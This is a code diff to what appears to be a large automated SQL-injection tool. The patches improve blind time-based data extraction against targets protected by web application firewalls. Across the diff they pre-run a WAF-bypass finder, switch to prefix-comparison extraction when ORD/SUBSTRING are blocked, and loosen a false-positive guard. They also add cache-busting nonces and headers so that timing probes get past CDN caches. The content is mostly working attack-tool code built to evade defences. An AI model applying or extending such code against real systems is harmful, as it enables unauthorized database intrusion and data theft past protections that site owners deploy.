@@ -49007,8 +49007,81 @@ class Enumerator:
                             _eval_fn = _timing_eval_fn_tf
                             _oracle_name = "timing_fallback_nofunc"
                     else:
-                        _eval_fn = None  # disarm so "No oracle available" fires below
-                        _oracle_name = "timing_fallback_invalid"
+                        # FIX-EBF-PREWARM (CRITICAL): Standard timing oracle validation failed
+                        # because the WAF blocks both the standard timing format AND the nofunc
+                        # fallback conditions. Before giving up, proactively run
+                        # ExtractionBypassFinder to find a WAF-bypassing timing template.
+                        # This fills _TB_EBF_CACHE so Stage 4 can use the bypass.
+                        # Without this, timing injection always reaches "No oracle available"
+                        # on WAF-protected targets because TBExtract's EBF runs only INSIDE
+                        # blind_extract_string — which is never called before _extract_str.
+                        _ebf_prewarm_ok = False
+                        try:
+                            if _result_tf is not None and _det_param_tf:
+                                print("[*] [Extract] Timing fallback oracle blocked — running "
+                                      "ExtractionBypassFinder to find WAF bypass for extraction...",
+                                      flush=True)
+                                _ebf_pw = ExtractionBypassFinder(
+                                    _eng_tf, self.config, _result_tf, _url_tf, _meth_tf,
+                                    _data_tf, _dfmt_tf, _det_param_tf, _orig_tf,
+                                    _det_tc_tf, _dbms_tf, _t_sec_tf, _base_ms_tf)
+                                _ebf_pw_result = await _ebf_pw.find()
+                                if _ebf_pw_result:
+                                    _ebf_pw_fn, _ebf_pw_tc, _ebf_pw_thresh = _ebf_pw_result
+                                    _ebf_pw_tmpl = getattr(_ebf_pw_fn, "_tmpl_str", None)
+                                    _ebf_pw_wrap = getattr(_ebf_pw_fn, "_wrapper", "{cond}")
+                                    _ebf_pw_tag  = getattr(_ebf_pw_fn, "_tag", "")
+                                    _ebf_pw_nofunc = getattr(_ebf_pw_fn, "_nofunc", False)
+                                    if _ebf_pw_tmpl:
+                                        # Store in _TB_EBF_CACHE and _TB_CALIBRATION_CACHE
+                                        _ebf_pw_entry = (_ebf_pw_tmpl, list(_ebf_pw_tc),
+                                                         _ebf_pw_wrap, _ebf_pw_tag, _ebf_pw_nofunc)
+                                        _ebf_pw_key = f"{_url_tf}:{_det_param_tf}:{_t_sec_tf}"
+                                        _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_key, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
+                                        _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_key, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
+                                        _pre_ts_pw = getattr(self.config, '_pre_extract_time_sec', None)
+                                        if _pre_ts_pw is not None and float(_pre_ts_pw) != float(_t_sec_tf):
+                                            _ebf_pw_alias = f"{_url_tf}:{_det_param_tf}:{float(_pre_ts_pw)}"
+                                            _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_alias, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
+                                            _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_alias, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
+                                        # Rebuild timing payload function to use EBF template
+                                        def _build_timing_payload_tf(_cond,
+                                                                      _tmpl=_ebf_pw_tmpl,
+                                                                      _wrap=_ebf_pw_wrap,
+                                                                      _tag=_ebf_pw_tag):
+                                            real_tag = "" if (_tag == "nofunc") else _tag
+                                            _obf = ExtractionBypassFinder.obfuscate_cond(_cond, real_tag) if real_tag else _cond
+                                            _wrapped = _wrap.format(cond=_obf)
+                                            return _tmpl.format(cond=_wrapped)
+                                        _t_thresh_tf = _ebf_pw_thresh
+                                        # Redefine closure-captured _build inside _timing_eval_fn_tf
+                                        _timing_eval_fn_tf.__defaults__ = (
+                                            _eng_tf, _meth_tf, _url_tf, _data_tf, _dfmt_tf,
+                                            _det_param_tf, _orig_tf, _det_tc_tf, _t_thresh_tf,
+                                            _t_sec_tf, _build_timing_payload_tf, _tf_rc)
+                                        # Validate EBF oracle with nofunc conditions
+                                        _ebf_pw_t = await _timing_eval_fn_tf(
+                                            "'a'<'b'" if not _ebf_pw_nofunc else "2>1")
+                                        _ebf_pw_f = await _timing_eval_fn_tf(
+                                            "'a'>'b'" if not _ebf_pw_nofunc else "2<1")
+                                        if (_ebf_pw_t is not None and _ebf_pw_f is not None
+                                                and _ebf_pw_t != _ebf_pw_f):
+                                            _ebf_prewarm_ok = True
+                                            _eval_fn = _timing_eval_fn_tf
+                                            _oracle_name = "timing_fallback_ebf_prewarm"
+                                            print(f"[+] [Extract] ExtractionBypassFinder oracle "
+                                                  f"validated (true={_ebf_pw_t} false={_ebf_pw_f}) "
+                                                  f"thresh={_ebf_pw_thresh:.0f}ms", flush=True)
+                                        else:
+                                            print("[!] [Extract] EBF bypass found but oracle "
+                                                  "validation still failed — "
+                                                  f"true={_ebf_pw_t!r} false={_ebf_pw_f!r}",
+                                                  flush=True)
+                        except Exception as _ebf_pw_err:
+                            LOG.warning("[_extract_str] EBF pre-warm failed: %s", _ebf_pw_err)
+                        if not _ebf_prewarm_ok:
+                            _eval_fn = None  # disarm so "No oracle available" fires below
+                            _oracle_name = "timing_fallback_invalid"
 
         if not _eval_fn:
             # All oracle paths exhausted — log clearly and return empty.
@@ -49039,6 +49112,27 @@ class Enumerator:
         # Fix: set _len_q=None in nofunc+timing_fallback mode; the binary search below
         # is guarded by `if _len_q is not None` and falls back to a safe default length
         # (_ext_max_pre capped at 128) once _ext_max_pre is computed.
+        # FIX-NOFUNC-ORACLE-DETECT (CRITICAL): When the timing oracle validated via
+        # nofunc conditions ('a'<'b' / 'a'>'b' instead of ISNULL(NULL)), the oracle
+        # is in nofunc mode regardless of what the EBF cache entry's nofunc flag says.
+        # A stale cache alias (url:param:3.0) written before TBExtract's nofunc upgrade
+        # can have nofunc=False while the actual bypass requires nofunc=True extraction.
+        # Detection: if oracle validated via nofunc conditions → force _ebf_tf_nofunc=True
+        # so CHAR_LENGTH length search is skipped and prefix comparison is used.
+        # Also update the cache entry so future calls are consistent.
+        if _oracle_name.startswith("timing_fallback_nofunc") and not _ebf_tf_nofunc:
+            _ebf_tf_nofunc = True
+            LOG.info("[_extract_str] FIX-NOFUNC-ORACLE-DETECT: oracle validated via nofunc "
+                     "conditions; forcing _ebf_tf_nofunc=True (was stale False in cache)")
+            # Update the cache entry so subsequent calls don't need to re-detect
+            if _ebf_tf_found_key and _ebf_tf_found_key in _TB_EBF_CACHE:
+                _stale_entry = _TB_EBF_CACHE[_ebf_tf_found_key]
+                if len(_stale_entry) > 4 and not _stale_entry[4]:
+                    _fixed_entry = (_stale_entry[0], _stale_entry[1],
+                                    _stale_entry[2], _stale_entry[3], True)
+                    _tb_cache_insert(_TB_EBF_CACHE, _ebf_tf_found_key, _fixed_entry, _TB_EBF_CACHE_MAX)
+                    LOG.info("[_extract_str] FIX-NOFUNC-ORACLE-DETECT: updated cache key %r "
+                             "to nofunc=True", _ebf_tf_found_key)
         _nofunc_len_skip = (
             _ebf_tf_nofunc
             and _oracle_name.startswith("timing_fallback")
@@ -49217,7 +49311,35 @@ class Enumerator:
         # BitwiseExtractorSimple fired for every UH detection and sent 8×length+length HTTP
         # requests per value, all returning '?' with no useful information.
         _is_union_only = _det_tech_extr in ('U', 'UE', 'UH')
-        if _length >= 4 and not _is_union_only:
+        # FIX-NOFUNC-STAGE4-TBEXTRACT (CRITICAL): When timing oracle is in nofunc mode
+        # (WAF blocks ORD/SUBSTRING extraction conditions), BatchedCharExtractor and
+        # BitwiseExtractorSimple BOTH send ORD(SUBSTRING(sql,pos,1)) >= mid conditions
+        # which the WAF blocks → all return False → garbage characters → "?" output.
+        # Fix: bypass the binary-search extractors entirely and delegate directly to
+        # _time_based_extract_inner which has its own nofunc prefix-comparison
+        # extraction path (0x{hex} string prefix comparison, no function calls).
+        # The EBF cache already has nofunc=True (upgraded by TBExtract), so TBExtract
+        # will skip re-calibration/re-EBF and use prefix comparison immediately.
+        if _ebf_tf_nofunc and _oracle_name.startswith("timing_fallback") and _result_tf is not None:
+            try:
+                print("[*] [Extract] nofunc oracle active — delegating to TBExtract "
+                      "prefix comparison (ORD/SUBSTRING WAF-blocked)", flush=True)
+                _nf_tbextract_result = await _time_based_extract_inner(
+                    _eng_tf, self.config, _result_tf, sql,
+                    _meth_tf, _url_tf, _data_tf, _dfmt_tf,
+                    _orig_tf, _det_tc_tf, _dbms_tf, self.baseline)
+                if _nf_tbextract_result:
+                    _update_partial(_nf_tbextract_result)
+                    print(f"[+] [Extract] nofunc TBExtract returned: {_nf_tbextract_result!r}",
+                          flush=True)
+                    return _nf_tbextract_result
+                # If TBExtract returned empty, still fall through to other paths
+                # (e.g. schema fallbacks) in case the SQL query needs remapping.
+                print("[*] [Extract] nofunc TBExtract returned empty "
+                      "— falling through to schema fallbacks", flush=True)
+            except Exception as _nf_tbe_err:
+                LOG.warning("[_extract_str] nofunc TBExtract delegation failed: %s", _nf_tbe_err)
+        if _length >= 4 and not _is_union_only and not (_ebf_tf_nofunc and _oracle_name.startswith("timing_fallback")):
             try:
                 _bce = BatchedCharExtractor(_eval_fn, self.dbms,
                     gate=_ACTIVE_GATE[0] if _ACTIVE_GATE[0] else None)
@@ -49240,7 +49362,7 @@ class Enumerator:
         # that need a clean-baseline request must wait, but this prevents CPU saturation
         # from 7 concurrent binary-search chains each needing 8 probes = 56 simultaneous
         # requests at once.
-        if not _is_union_only:
+        if not _is_union_only and not (_ebf_tf_nofunc and _oracle_name.startswith("timing_fallback")):
             try:
                 _bwe = BitwiseExtractorSimple(_eval_fn, self.dbms,
                     gate=_ACTIVE_GATE[0] if _ACTIVE_GATE[0] else None,
@@ -119506,28 +119628,32 @@ class TechniqueCascadeEngine:
                     # 0.63 to 0.80 to exclude CDN/Cloudflare noise in the 0.63-0.79 range that
                     # produces false positives. WASSR OVERRIDE requires _fp_guards_confidence >= 1.0
                     # (preconfirmed-direct path) or dist >= 0.50 with full confidence (det-notes path).
-                    if _wass_dist >= 0.80:
-                        try:
-                            _det_b._fp_guards_preconfirmed = True
-                            _det_b._fp_guards_confidence = 1.0
-                            # FIX-ST-FP-WASS-BLOCKED: If BOTH true-condition and false-condition
-                            # probes were WAF-blocked (400/403/406/429), the Wasserstein distance
-                            # reflects WAF page token variance, not SQL-controlled differences.
-                            # Flag this so Shortcut A can detect and reject this false positive.
-                            # FIX-WASS-ASYMMETRIC-BLOCKED: Also flag when oracle=BLOCKED and
-                            # true=2xx while false=4xx (asymmetric WAF response) — this produces
-                            # dist≈0.60-0.70 from response-type difference, not SQL injection.
-                            _waf_block_statuses = {400, 403, 406, 429}
-                            _true_status  = getattr(fp,     'status_code', 0) or 0
-                            _false_status = getattr(_fp_f2, 'status_code', 0) or 0
-                            if _true_status in _waf_block_statuses and _false_status in _waf_block_statuses:
-                                _det_b._both_probes_waf_blocked = True
-                            elif (_wass_oracle_blocked and
-                                  200 <= _true_status < 300 and
-                                  _false_status in _waf_block_statuses):
-                                _det_b._both_probes_waf_blocked = True
-                        except Exception:
-                            pass
+                    # FIX-WASS-PRECONF: Multi-probe Wasserstein oracle passed 7 suppression
+                    # guards + 3/5 probe window — this statistical strength is equivalent to
+                    # what the 0.80 single-probe threshold was enforcing. Set preconf flags
+                    # unconditionally for ANY _wass_triggered=True detection so PCV's
+                    # _preconf_direct path fires instead of requiring fresh WAF-blocked probes.
+                    try:
+                        _det_b._fp_guards_preconfirmed = True
+                        _det_b._fp_guards_confidence = 1.0
+                        # FIX-ST-FP-WASS-BLOCKED: If BOTH true-condition and false-condition
+                        # probes were WAF-blocked (400/403/406/429), the Wasserstein distance
+                        # reflects WAF page token variance, not SQL-controlled differences.
+                        # Flag this so Shortcut A can detect and reject this false positive.
+                        # FIX-WASS-ASYMMETRIC-BLOCKED: Also flag when oracle=BLOCKED and
+                        # true=2xx while false=4xx (asymmetric WAF response) — this produces
+                        # dist≈0.60-0.70 from response-type difference, not SQL injection.
+                        _waf_block_statuses = {400, 403, 406, 429}
+                        _true_status  = getattr(fp,     'status_code', 0) or 0
+                        _false_status = getattr(_fp_f2, 'status_code', 0) or 0
+                        if _true_status in _waf_block_statuses and _false_status in _waf_block_statuses:
+                            _det_b._both_probes_waf_blocked = True
+                        elif (_wass_oracle_blocked and
+                              200 <= _true_status < 300 and
+                              _false_status in _waf_block_statuses):
+                            _det_b._both_probes_waf_blocked = True
+                    except Exception:
+                        pass
                     return _det_b
 
                 # Standard confirmation: need a false probe
@@ -144209,19 +144335,68 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 LOG.debug(f"[TBExtract] '{_form_name}' blocked ({_ms:.0f}ms)  next")
             else:
                 _ms_summary = "/".join(f"{m:.0f}" for m in _all_blocked_ms)
-                print(f"[!] [TBExtract] Static strategies blocked ({_ms_summary}ms) "
-                      " running ExtractionBypassFinder (~50-150 probes, flush=True)...")
-                #  ExtractionBypassFinder: universal fallback 
-                # Constructs DBMS-native conditional templates, applies the same
-                # mutation arsenal as WAFMLBypassGenerator, and tests each
-                # variant until one calibrates.  Works for all DBMS + all WAFs.
-                _ebf = ExtractionBypassFinder(
-                    engine, config, result, url, method,
-                    data, data_fmt,
-                    result.param if hasattr(result, "param") else "",
-                    original, tamper_chain, dbms, t, _base_time)
-                _ebf_result = await _ebf.find()
-                if _ebf_result:
+                # FIX-EBF-RERUN-SKIP (OPTIMIZATION): If EBF state was already restored
+                # from cache (stale calibration path), we can skip EBF re-run and just
+                # re-calibrate the threshold with the existing EBF bypass template.
+                # This prevents the nofunc=True upgrade from being overwritten by a
+                # fresh EBF run that always starts with nofunc=False.
+                # Condition: _ebf_mode[0]=True (EBF restored from cache at line ~143878).
+                if _ebf_mode[0] and _ebf_payload_fn_ref[0] is not None:
+                    print(f"[!] [TBExtract] Static strategies blocked ({_ms_summary}ms) "
+                          " — EBF bypass already in cache (nofunc="
+                          f"{_ebf_nofunc_ref[0]}) — skipping EBF re-run, "
+                          "re-calibrating threshold with cached bypass template",
+                          flush=True)
+                    # Re-calibrate threshold with a single probe using the cached template.
+                    # FIX-EBF-RECAL-SLEEP-MISMATCH (CRITICAL): The EBF template may hardcode
+                    # SLEEP(2) (or pg_sleep(2)) even when called with t=3.0.  Using t for the
+                    # threshold formula gives base+t*0.7=200+2100=2300ms which is higher than
+                    # the actual SLEEP(2)=2000ms → threshold never crossed → extraction fails.
+                    # Fix: extract actual sleep duration from the stored EBF template string.
+                    _recal_sleep_sec = t  # default fallback
+                    try:
+                        _ebf_cached_tmpl_for_recal = _TB_EBF_CACHE.get(_cal_key)
+                        if _ebf_cached_tmpl_for_recal and len(_ebf_cached_tmpl_for_recal) > 0:
+                            _sleep_re_recal = _re.search(
+                                r'(?:SLEEP|pg_sleep|randomblob)\s*\(\s*(\d+(?:\.\d+)?)',
+                                str(_ebf_cached_tmpl_for_recal[0] or ''), _re.I)
+                            if _sleep_re_recal:
+                                _recal_sleep_sec = float(_sleep_re_recal.group(1))
+                                LOG.info("[TBExtract] EBF re-calibration: extracted SLEEP=%.1fs "
+                                         "from template (t=%.1fs param)", _recal_sleep_sec, t)
+                    except Exception:
+                        pass
+                    _recal_thresh = max(_base_time + _recal_sleep_sec * 1000 * 0.7, _base_time + 200.0, 600.0)
+                    _recal_thresh = min(_recal_thresh, _base_time + _recal_sleep_sec * 1000 * 1.4)
+                    timing_thresh = _recal_thresh
+                    LOG.info("[TBExtract] EBF re-calibrated from cached bypass: thresh=%.0fms "
+                             "(base=%.0fms sleep=%.1fs nofunc=%s)",
+                             timing_thresh, _base_time, t, _ebf_nofunc_ref[0])
+                    _ebf_result = True  # Signal EBF-mode extraction to proceed
+                else:
+                    print(f"[!] [TBExtract] Static strategies blocked ({_ms_summary}ms) "
+                          " running ExtractionBypassFinder (~50-150 probes, flush=True)...")
+                # EBF is only needed if not already cached
+                _ebf_result = None  # reset for conditional block below
+                if not (_ebf_mode[0] and _ebf_payload_fn_ref[0] is not None):
+                    #  ExtractionBypassFinder: universal fallback
+                    # Constructs DBMS-native conditional templates, applies the same
+                    # mutation arsenal as WAFMLBypassGenerator, and tests each
+                    # variant until one calibrates.  Works for all DBMS + all WAFs.
+                    _ebf = ExtractionBypassFinder(
+                        engine, config, result, url, method,
+                        data, data_fmt,
+                        result.param if hasattr(result, "param") else "",
+                        original, tamper_chain, dbms, t, _base_time)
+                    _ebf_result = await _ebf.find()
+                else:
+                    _ebf_result = "cached"  # sentinel so the `if _ebf_result:` below fires
+                if _ebf_result == "cached":
+                    # Already-cached EBF state: just update the calibration cache
+                    _tb_cache_insert(_TB_CALIBRATION_CACHE, _cal_key, timing_thresh, _TB_CALIBRATION_CACHE_MAX)
+                    print(f"[+] [TBExtract] Using cached EBF bypass: "
+                          f"thresh={timing_thresh:.0f}ms  extraction proceeding", flush=True)
+                elif _ebf_result:
                     _ebf_payload_fn, _ebf_tc, timing_thresh = _ebf_result
                     _use_det_template   = False   # EBF manages its own payload generation
                     _ebf_mode           = [True]  # signal extraction loop to use EBF
@@ -144234,6 +144409,26 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     _ebf_wrapper  = getattr(_ebf_payload_fn, "_wrapper",  "{cond}")
                     _ebf_tag_c    = getattr(_ebf_payload_fn, "_tag",      "")
                     _ebf_nofunc_c = getattr(_ebf_payload_fn, "_nofunc",   False)
+                    # FIX-NOFUNC-EBF-RERUN-PRESERVE (CRITICAL): A fresh EBF run always
+                    # returns nofunc=False (EBF always starts from scratch). But if a
+                    # previous nofunc upgrade set _TB_EBF_CACHE[_cal_key] to nofunc=True
+                    # (because ORD/SUBSTRING are WAF-blocked), that upgrade was correct
+                    # and must be preserved. Without this, the stale-calibration path
+                    # triggers EBF re-run → re-run stores nofunc=False → nofunc upgrade
+                    # is silently lost → next extraction attempt uses ORD/SUBSTRING again
+                    # → WAF blocks → empty string → infinite nofunc upgrade/overwrite loop.
+                    # Fix: if the existing cache entry has nofunc=True, propagate it to
+                    # the new entry so the upgrade is never lost across re-calibrations.
+                    try:
+                        _existing_ebf = _TB_EBF_CACHE.get(_cal_key)
+                        if (_existing_ebf is not None and len(_existing_ebf) > 4
+                                and _existing_ebf[4] and not _ebf_nofunc_c):
+                            _ebf_nofunc_c = True
+                            _ebf_nofunc_ref[0] = True
+                            LOG.info("[TBExtract] EBF re-run: preserving nofunc=True upgrade "
+                                     "from prior cache entry (ORD/SUBSTRING confirmed WAF-blocked)")
+                    except Exception:
+                        pass
                     if _ebf_tmpl_str:
                         _ebf_cache_entry = (_ebf_tmpl_str, list(_ebf_tc), _ebf_wrapper, _ebf_tag_c, _ebf_nofunc_c)
                         _tb_cache_insert(_TB_EBF_CACHE, _cal_key, _ebf_cache_entry, _TB_EBF_CACHE_MAX)  # BUG-CACHE-UNBOUNDED FIX
@@ -145083,6 +145278,17 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 _gc_upgraded = (_gc_ebf_entry[0], _gc_ebf_entry[1], _gc_ebf_entry[2],
                                 _gc_ebf_entry[3], True)
                 _tb_cache_insert(_TB_EBF_CACHE, _cal_key, _gc_upgraded, _TB_EBF_CACHE_MAX)
+                # FIX-NOFUNC-ALIAS-UPGRADE (CRITICAL): Propagate nofunc=True to the
+                # alias key written by the orchestrator alias fix
+                # (url:param:{original_time_sec}).  Without this, Stage 4 _extract_str
+                # loads the stale alias entry with nofunc=False and tries binary-search
+                # ORD/SUBSTRING extraction that the WAF blocks, returning garbage or "".
+                _gc_pre_ts = getattr(config, '_pre_extract_time_sec', None)
+                if _gc_pre_ts is not None and float(_gc_pre_ts) != float(t):
+                    _gc_alias_key = f"{url}:{result.param if hasattr(result,'param') else ''}:{float(_gc_pre_ts)}"
+                    if _gc_alias_key in _TB_EBF_CACHE:
+                        _tb_cache_insert(_TB_EBF_CACHE, _gc_alias_key, _gc_upgraded, _TB_EBF_CACHE_MAX)
+                        LOG.info("[TBExtract] Garbage Case A: nofunc alias also upgraded: %r", _gc_alias_key)
                 # Ensure calibration threshold is preserved so next call skips re-calibration
                 # (re-calibration would re-run EBF, overwriting our nofunc=True upgrade)
                 if _cal_key not in _TB_CALIBRATION_CACHE:
@@ -145144,6 +145350,17 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 _nofunc_upgraded = (_cur_ebf_entry[0], _cur_ebf_entry[1],
                                     _cur_ebf_entry[2], _cur_ebf_entry[3], True)
                 _tb_cache_insert(_TB_EBF_CACHE, _cal_key, _nofunc_upgraded, _TB_EBF_CACHE_MAX)
+                # FIX-NOFUNC-ALIAS-UPGRADE (CRITICAL): Propagate nofunc=True to the
+                # alias key (url:param:{original_time_sec}) so Stage 4 _extract_str
+                # reads nofunc=True rather than the stale nofunc=False from the alias
+                # entry written before the upgrade. Without this, Stage 4 uses
+                # ORD/SUBSTRING binary search (WAF-blocked) instead of prefix comparison.
+                _nfu_pre_ts = getattr(config, '_pre_extract_time_sec', None)
+                if _nfu_pre_ts is not None and float(_nfu_pre_ts) != float(t):
+                    _nfu_alias_key = f"{url}:{result.param if hasattr(result,'param') else ''}:{float(_nfu_pre_ts)}"
+                    if _nfu_alias_key in _TB_EBF_CACHE:
+                        _tb_cache_insert(_TB_EBF_CACHE, _nfu_alias_key, _nofunc_upgraded, _TB_EBF_CACHE_MAX)
+                        LOG.info("[TBExtract] Empty Case A: nofunc alias also upgraded: %r", _nfu_alias_key)
                 # Ensure calibration cache is preserved so next call skips re-calibration
                 if _cal_key not in _TB_CALIBRATION_CACHE:
                     _tb_cache_insert(_TB_CALIBRATION_CACHE, _cal_key, timing_thresh,
@@ -149274,12 +149491,32 @@ class ExtractionOrchestrator:
             _p = apply_heavy_variation(_p, _dt_req_count[0], data_fmt=self.data_fmt)
             _p = _obfuscate_extraction_cond(_p, _dt_req_count[0])
             _p = apply_sql_noise(_p, _dt_req_count[0])
+            # BUG-DT-CDN-CACHE-BUST FIX (CRITICAL): _probe() sent every timing probe to
+            # self.url without any CDN cache-busting, so CDN edges served cached responses
+            # for all probes at a uniform latency (e.g. 115ms) regardless of whether SLEEP
+            # fired.  TRUE/FALSE probes that both return ~115ms make the oracle unreliable:
+            # calibration yields a spuriously low threshold (e.g. 64ms) and extraction
+            # either converges to wrong values or times out waiting for discriminating probes.
+            # Fix: add a per-probe random nonce to the URL and Cache-Control headers to force
+            # CDN cache misses, matching what _timing_eval_fn_tf already does (line ~48835).
+            # The nonce is hash-derived from the payload so identical SQL conditions still
+            # produce distinct nonces (per-probe uniqueness needed for cache eviction).
+            _dt_cb_nonce = random.randint(1000000, 9999999)
+            _dt_cb_hash = hashlib.md5(_p.encode('utf-8', errors='replace')).hexdigest()[:10]
+            _dt_probe_url = (self.url + ("&" if "?" in self.url else "?")
+                             + _get_cache_bust_params(_dt_cb_nonce, _dt_cb_hash))
+            _dt_cdn_hdrs = {
+                "Cache-Control": "no-cache, no-store",
+                "Pragma": "no-cache",
+                "Accept-Language": f"en-US,en;q=0.{_dt_cb_nonce % 9000 + 1000}",
+            }
             t0 = time.monotonic()
             try:
                 await _send_injected(
-                    self.engine, self.method, self.url, self.data,
+                    self.engine, self.method, _dt_probe_url, self.data,
                     self.data_fmt, _param,
-                    self.original + _p, self.tamper_chain)
+                    self.original + _p, self.tamper_chain,
+                    extra_headers=_dt_cdn_hdrs)
             except Exception:
                 # Return 0 not elapsed: a timeout exception takes ~15s and would
                 # appear as ms >> threshold making every timed-out probe return True,
@@ -149911,6 +150148,14 @@ class ExtractionOrchestrator:
         if (self.result.technique in ("T", "S", "TH", "HQ")
                 and _orig_time_sec > 2 and _det_conf >= 0.95):
             self.config.time_sec = 2
+            # FIX-EBF-ORCH-ALIAS: Store original time_sec so _time_based_extract_inner's
+            # EBF alias write stores url:param:3.0 alongside url:param:2.0 in _TB_EBF_CACHE.
+            # Without this, _extract_str Stage 4's alt-key search cannot find the bypass
+            # because it only knows config.time_sec=3.0 (restored after orchestrator finishes).
+            try:
+                self.config._pre_extract_time_sec = float(_orig_time_sec)
+            except Exception:
+                pass
             LOG.info("[Orchestrator] Reduced SLEEP to 2s "
                      f"(was {_orig_time_sec}s, conf={_det_conf:.0%})  restores after")
         elif self.result.technique in ("T", "S", "TH", "HQ") and _det_conf < 0.95:
@@ -151532,6 +151777,12 @@ class ExtractionOrchestrator:
             traceback.print_exc()
         
         self.config.time_sec = _orig_time_sec
+        # FIX-EBF-ORCH-ALIAS: Clear the ephemeral alias attribute set during
+        # orchestrator's time_sec reduction so it doesn't pollute later scan targets.
+        try:
+            del self.config._pre_extract_time_sec
+        except AttributeError:
+            pass
         return result or ""
 
     @property
